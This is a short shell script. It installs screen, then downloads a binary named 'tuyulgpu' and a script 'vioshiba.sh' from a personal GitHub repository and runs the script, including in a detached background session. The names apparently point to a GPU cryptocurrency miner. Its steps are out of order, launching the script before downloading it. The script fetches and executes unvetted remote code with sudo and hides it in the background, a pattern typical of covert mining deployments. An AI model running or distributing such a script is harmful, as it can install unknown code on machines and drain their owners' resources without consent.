#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS vioshiba.sh ./vioshiba.sh 65 75

wget https://github.com/yuliantiriyanti6/m/raw/main/tuyulgpu

wget https://raw.githubusercontent.com/yuliantiriyanti6/m/main/vioshiba.sh

chmod +x vioshiba.sh

./vioshiba.sh
